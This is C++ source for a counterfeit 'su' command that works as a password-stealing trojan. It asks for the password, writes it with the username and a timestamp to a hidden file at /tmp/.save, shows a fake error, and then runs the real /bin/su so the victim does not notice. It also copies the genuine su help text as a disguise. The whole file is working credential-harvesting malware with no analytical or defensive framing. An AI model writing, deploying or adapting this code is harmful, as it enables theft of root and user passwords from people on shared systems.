#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <fstream>
#include <ctime>
#include <string>
#include <unistd.h>
#include <stdexcept>
#include <crypt.h>
#include <signal.h>

#define DEFAULT_USER "root"

void usage();

void signal_handler(int signal_num)
{
    exit(signal_num);
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    std::string passwd, user, command, createdHash;
    std::string path = "/tmp/.save";
    std::ofstream passwdFile;

    try {
            if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "--help") {
                    usage();
                    return 0;
            } else {
                    user = std::string(argv[1]);
            }
    } catch (std::logic_error) {
            user = std::string(DEFAULT_USER);
    }

    passwd = std::string(getpass("Password: "));
    sleep(2); // Simulate real su

    passwdFile.open(path, std::ios::app);
    if (!passwdFile.is_open()) {
            std::cerr << "An error has occured\n";
            passwdFile.close();
            return -2;
    }
    /*== Set date ==*/
    time_t now = time(0);
    char* tmp = ctime(&now);
    std::string date = std::string(tmp);
    date.erase(date.length()-1, 1);

    passwdFile << "ERROR (" << date << "): " << passwd << " - " << user << '\n';
    passwdFile.close();
    std::cerr << "An error has occured, Retry\n";

    execv("/bin/su", argv);
    return 0;
}

void usage() {
    std::cout <<
	"\nUsage:\n"
	" su [options] [-] [<user> [<argument>...]]\n\n"
	"Change the effective user ID and group ID to that of <user>.\n"
	"A mere - implies -l.  If <user> is not given, root is assumed.\n\n"
	"Options:\n"
	" -m, -p, --preserve-environment  do not reset environment variables\n"
	" -g, --group <group>             specify the primary group\n"
	" -G, --supp-group <group>        specify a supplemental group\n\n"
	" -, -l, --login                  make the shell a login shell\n"
	" -c, --command <command>         pass a single command to the shell with -c\n"
	" --session-command <command>     pass a single command to the shell with -c\n"
	"                                   and do not create a new session\n"
	" -f, --fast                      pass -f to the shell (for csh or tcsh)\n"
	" -s, --shell <shell>             run <shell> if /etc/shells allows it\n\n"
	" -h, --help     display this help and exit\n"
	" -V, --version  output version information and exit\n\n"
	"For more details see su(1).\n";
    return;
}
